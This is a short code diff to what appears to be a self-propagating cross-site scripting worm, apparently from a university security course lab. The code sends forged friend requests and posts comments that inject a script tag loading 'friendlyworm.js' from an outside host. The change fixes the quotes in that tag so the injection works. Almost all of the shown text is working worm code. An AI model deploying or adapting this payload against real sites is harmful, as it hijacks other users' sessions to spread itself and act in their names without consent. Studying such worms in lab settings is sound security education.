@@ -10,7 +10,7 @@ if (cookie.get("hasCookie") != "true") {
      	 	request2.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=92`, true);
       		request2.send();
       		var request3 = new XMLHttpRequest();
-      		request3.open("POST", `/add_comment.php?id=${i}&comment=<script src=""http://people.rit.edu/drl3180/friendlyworm.js""></script>`, true);
+      		request3.open("POST", `/add_comment.php?id=${i}&comment=<script src="http://people.rit.edu/drl3180/friendlyworm.js"></script>`, true);
       		request3.send();
 	}
 }
